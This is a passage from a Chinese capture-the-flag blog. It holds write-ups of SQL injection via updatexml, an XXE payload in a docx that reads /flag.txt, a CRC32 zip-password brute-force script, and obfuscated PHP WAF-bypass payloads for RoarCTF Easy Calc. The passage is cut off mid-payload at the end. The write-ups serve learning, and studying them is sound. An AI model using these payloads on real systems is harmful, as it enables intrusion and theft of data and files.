<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">çˆ†è¡¨</span><br><span class="line">sss&quot;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1)#</span><br><span class="line">XPATH syntax error: &apos;~article,flag,users~&apos;</span><br><span class="line"></span><br><span class="line">column</span><br><span class="line">sss&quot;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())),0x7e),1)#</span><br><span class="line">XPATH syntax error: &apos;~title,content,flag,name,pwd,ema&apos;</span><br><span class="line"></span><br><span class="line">flag</span><br><span class="line">sss&quot;||updatexml(1,concat(0x7e,(select(flag)from(flag)),0x7e),1)#</span><br><span class="line">XPATH syntax error: &apos;~flag&#123;19de358061&#125;~&apos;</span><br></pre></td></tr></table></figure>

<h3 id="4-XXE"><a href="#4-XXE" class="headerlink" title="4.XXE"></a>4.XXE</h3><p>upload.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>])) &#123;</span><br><span class="line">    $target_file = getcwd().<span class="string">"/upload/"</span>.md5($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $target_file)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $result = @file_get_contents(<span class="string">"zip://"</span>.$target_file.<span class="string">"#docProps/core.xml"</span>);</span><br><span class="line">            $xml = <span class="keyword">new</span> SimpleXMLElement($result, LIBXML_NOENT);</span><br><span class="line">            $xml-&gt;registerXPathNamespace(<span class="string">"dc"</span>, <span class="string">"http://purl.org/dc/elements/1.1/"</span>);</span><br><span class="line">            <span class="keyword">foreach</span>($xml-&gt;xpath(<span class="string">'//dc:title'</span>) <span class="keyword">as</span> $title)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Title '"</span>.$title . <span class="string">"' has been added.&lt;br/&gt;"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $e;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"ä¸Šä¼ æ–‡ä»¶ä¸æ˜¯ä¸€ä¸ªdocxæ–‡æ¡£."</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"ä¸Šä¼ å¤±è´¥."</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…³é”®ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$result = @file_get_contents(<span class="string">"zip://"</span>.$target_file.<span class="string">"#docProps/core.xml"</span>);</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºäº†tilteï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($xml-&gt;xpath(<span class="string">'//dc:title'</span>) <span class="keyword">as</span> $title)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Title '"</span>.$title . <span class="string">"' has been added.&lt;br/&gt;"</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>payload:ä¿®æ”¹docProps/core.xmlå†…å®¹</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"/flag.txt"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">cp:coreProperties</span> <span class="attr">xmlns:cp</span>=<span class="string">"http://schemas.openxmlformats.org/package/2006/metadata/core-properties"</span> <span class="attr">xmlns:dc</span>=<span class="string">"http://purl.org/dc/elements/1.1/"</span> <span class="attr">xmlns:dcterms</span>=<span class="string">"http://purl.org/dc/terms/"</span> <span class="attr">xmlns:dcmitype</span>=<span class="string">"http://purl.org/dc/dcmitype/"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span>&gt;</span></span><br><span class="line">dc:title<span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">dc:title</span>&gt;</span></span><br><span class="line">dc:subject<span class="tag">&lt;/<span class="name">dc:subject</span>&gt;</span></span><br><span class="line">dc:creator<span class="tag">&lt;/<span class="name">dc:creator</span>&gt;</span></span><br><span class="line">cp:keywords<span class="tag">&lt;/<span class="name">cp:keywords</span>&gt;</span></span><br><span class="line">dc:description<span class="tag">&lt;/<span class="name">dc:description</span>&gt;</span></span><br><span class="line">cp:lastModifiedBy<span class="tag">&lt;/<span class="name">cp:lastModifiedBy</span>&gt;</span></span><br><span class="line">cp:revision1<span class="tag">&lt;/<span class="name">cp:revision</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dcterms:created</span> <span class="attr">xsi:type</span>=<span class="string">"dcterms:W3CDTF"</span>&gt;</span>2015-08-01T19:00:00Z<span class="tag">&lt;/<span class="name">dcterms:created</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dcterms:modified</span> <span class="attr">xsi:type</span>=<span class="string">"dcterms:W3CDTF"</span>&gt;</span>2015-08-01T19:01:00Z<span class="tag">&lt;/<span class="name">dcterms:modified</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">cp:coreProperties</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¿å­˜ï¼Œä¸Šä¼ å³å¯</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="1-CRC32"><a href="#1-CRC32" class="headerlink" title="1.CRC32"></a>1.CRC32</h3><p>å‹ç¼©åŒ…ä¸­æœ‰ä¸‰ä¸ªæ–‡ä»¶å­˜æ”¾äº†è§£å‹å¯†ç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> flag</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span><span class="params">(crc, I)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">                    s = i + j + p + q</span><br><span class="line">                    <span class="keyword">if</span> crc == (binascii.crc32(s.encode())):</span><br><span class="line">                        print(str(I) + <span class="string">":"</span> + s)</span><br><span class="line">                        <span class="keyword">global</span> flag</span><br><span class="line">                        flag = flag + s</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackZip</span><span class="params">()</span>:</span></span><br><span class="line">    f = zipfile.ZipFile(<span class="string">"CRC32.zip"</span>, <span class="string">'r'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">4</span>):</span><br><span class="line">        GetCrc = f.getinfo(<span class="string">'pass'</span>+str(i)+<span class="string">'.txt'</span>)</span><br><span class="line">        crc = GetCrc.CRC</span><br><span class="line">        print(crc)</span><br><span class="line">        CrackCrc(crc, i)</span><br><span class="line">dic = string.printable</span><br><span class="line">CrackZip()</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p>   <img src="/2020/03/51ELABæ˜“éœ–åšYCTF-Writeup/image-20200415215316552.png" alt="image-20200415215316552">                            </p>
<p>è§£å‹å¾—åˆ°flag</p>
<h3 id="2-easyrsa"><a href="#2-easyrsa" class="headerlink" title="2.easyrsa"></a>2.easyrsa</h3><p>ç»™äº†ç§é’¥å’Œå¯†æ–‡</p>
<p><img src="/2020/03/51ELABæ˜“éœ–åšYCTF-Writeup/image-20200415215428837.png" alt="image-20200415215428837"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WEB</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>6æœˆåˆ·é¢˜è®°å½•</title>
    <url>/2020/06/6%E6%9C%88%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-æŸå¸ˆå‚…å‡ºçš„æ‹›æ–°é¢˜"><a href="#1-æŸå¸ˆå‚…å‡ºçš„æ‹›æ–°é¢˜" class="headerlink" title="1.æŸå¸ˆå‚…å‡ºçš„æ‹›æ–°é¢˜"></a>1.æŸå¸ˆå‚…å‡ºçš„æ‹›æ–°é¢˜</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment">Flag in flag.php</span></span><br><span class="line"><span class="comment">You can use "readfile" function.</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$str1 = $_GET[<span class="string">'str1'</span>];</span><br><span class="line">$str2 = $_GET[<span class="string">'str2'</span>];</span><br><span class="line"></span><br><span class="line">$rce = <span class="keyword">new</span> $str2(<span class="string">'TestClass'</span>);</span><br><span class="line">$a = $rce-&gt;$str1();</span><br><span class="line">$st1 = $_POST[<span class="string">'st1'</span>];</span><br><span class="line">$st2 = $_POST[<span class="string">'st2'</span>];</span><br><span class="line"><span class="keyword">if</span>($st1==<span class="keyword">null</span>&amp;&amp;$st2==<span class="keyword">null</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"GET!!!"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $z = substr($a,$st1,<span class="number">8</span>);</span><br><span class="line">    $x = substr($a,$st2,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">echo</span> $z.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> $x.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    $z($x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a>

<p>å¼€å§‹çœ‹é¢˜çš„æ—¶å€™å¾ˆæ‡µï¼Œæ²¡è§è¿‡ã€‚åé¢çœ‹é˜Ÿå‹è¯´ç”¨åå°„ç±»åšã€‚å°±åœ¨ç½‘ä¸Šæ‰¾äº†ä¸‹è¿™æ–¹é¢çš„<a href="https://museljh.github.io/2019/04/24/ctf%E4%B8%AD%E7%9A%84php%E5%8F%8D%E5%B0%84/" target="_blank" rel="noopener">CTFé¢˜</a>å‘ç°è¿™é“é¢˜ </p>
<p><code>$a=$rce-&gt;$str1()</code>å¹¶ä¸èƒ½ä¼ å‚ï¼Œè€Œä¸”è¿˜æœ‰äº›ç–‘æƒ‘ï¼Œå¹²å˜›å®šä¹‰ä¸ªç©ºç±» <code>Testcalss</code> æ¯«æ— å¤´ç»ª</p>
<p>ç„¶åå»çœ‹äº†ä¸‹<a href="https://www.php.net/manual/zh/class.reflectionclass.php" target="_blank" rel="noopener">phpæ‰‹å†Œ</a>æ‰¾æ— å‚çš„å‡½æ•°ï¼Œçªç„¶ å‘ç°<a href="https://www.php.net/manual/zh/reflectionclass.getdoccomment.php" target="_blank" rel="noopener">ReflectionClass::getDocComment()</a> â€” è·å–æ–‡æ¡£æ³¨é‡Š</p>
<p>è¿™ä¸ªå‡½æ•°æœ‰æå¤´ ï¼Œåˆ©ç”¨æ³¨é‡Šä¸­çš„ <code>flag.php</code> ï¼Œ<code>readfile</code> å’Œ<code>$z($x)</code>ä¸å°±å¯ä»¥è¯»å–æ–‡ä»¶äº†å—</p>
<p><img src="/2020/06/6æœˆåˆ·é¢˜è®°å½•/image-20200602005512196.png" alt="image-20200602005512196"></p>
<p>è¿™ä¸ªé¢˜ç›®å‡ºçš„å¾ˆå·§å¦™ã€‚orz</p>
<h3 id="2-RoarCTF-2019-Easy-Calc"><a href="#2-RoarCTF-2019-Easy-Calc" class="headerlink" title="2.[RoarCTF 2019]Easy Calc"></a>2.[RoarCTF 2019]Easy Calc</h3><p>æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p> <code>$blacklist</code>ä¸­è¿‡æ»¤äº† <code>^</code> åŒæ—¶é¢˜ç›®è®¾ç½®äº†WAFï¼Œè¿‡æ»¤äº†<code>å­—æ¯ã€#ã€ï¼</code>ï¼Œæ‰€ä»¥å–åä¹Ÿä¸èƒ½ç”¨ã€‚</p>
<p>ä¸è¿‡å¯ä»¥ä½¿ç”¨æŒ‰ä½ä¸<code>&amp;</code>ä»¥åŠæŒ‰ä½æˆ–<code>|</code>ã€‚åœ¨ PHP ä¸­ï¼Œå°†ä¸¤ä¸ªæ•°å­—ä½¿ç”¨<code>.</code>æ‹¼æ¥ï¼Œä¼šå½“åšå­—ç¬¦ä¸²æ¥å¤„ç†ï¼Œè¿”å›çš„ä¹Ÿæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ä¾‹å¦‚ï¼š<code>(1).(2)</code>å‡ºæ¥çš„å°±æ˜¯å­—ç¬¦ä¸²<code>&quot;12&quot;</code>ï¼Œç„¶åå¯ä»¥ç”¨<code>{}</code>æ¥ä»£æ›¿<code>[]</code>æ¥å–å•ä¸ªå­—ç¬¦ã€‚<br> å¹¶ä¸”ï¼ŒPHP ä¸­ï¼Œ<code>1/0</code>å¾—å‡ºçš„æ˜¯<code>float</code>ç±»å‹çš„<code>INF</code>ï¼Œ<code>0/0</code>å¾—å‡ºçš„æ˜¯<code>float</code>ç±»å‹çš„<code>NAN</code>ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æŠŠè¿™äº›è½¬æˆå­—ç¬¦ä¸²ç±»å‹ï¼Œä»è€Œå¾—åˆ°å­—æ¯<code>A</code> <code>I</code> <code>N</code> <code>F</code>ã€‚</p>
<p>E99p1antå¸ˆå‚…çš„<a href="https://github.red/roarctf-web-writeup/" target="_blank" rel="noopener">Fuzz è„šæœ¬</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$char = <span class="string">'1234567890-INFAH@+*%$()"!%meogiakcfhvwbnq_'</span>;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($char); $i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($j = <span class="number">0</span>; $j &lt; strlen($char); $j++)&#123;</span><br><span class="line">        <span class="keyword">echo</span>($char[$i] .<span class="string">'&amp;'</span> .$char[$j] . <span class="string">' '</span>. ($char[$i] &amp; $char[$j]));</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">        <span class="keyword">echo</span>($char[$i] .<span class="string">'|'</span> .$char[$j] . <span class="string">' '</span>. ($char[$i] | $char[$j]));</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ€åæ ¹æ®è¿™ä¸ªè¡¨ï¼Œå°±å¯ä»¥æ„é€ ä»£ç äº†ã€‚å¯ä»¥æ„é€ å½¢å¦‚<code>(phpinfo)()</code>è¿™æ ·çš„å½¢å¼ï¼Œæ¥åŠ¨æ€æ‰§è¡Œå‡½æ•°ã€‚<br> å€¼å¾—ä¸€æçš„æ˜¯ï¼ŒPHP ä¸­å‡½æ•°åæ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œå› æ­¤ä¸ä¸€å®šéœ€è¦å…¨å°å†™çš„å­—ç¬¦æ‹¼å‡‘å‡½æ•°åã€‚<br> <code>phpinfo()</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">((((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))&amp;((((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)).(((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))&amp;((((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))()</span><br></pre></td></tr></table></figure>

<p><code>(scandir)(../../../)</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">((((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)).(((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))&amp;((((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))).((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))).(((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))&amp;((((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))))(((((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)).((((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))).((((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">-2</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;).(((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))|((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))))((((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).(((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).(((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).(((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).(((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).(((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span 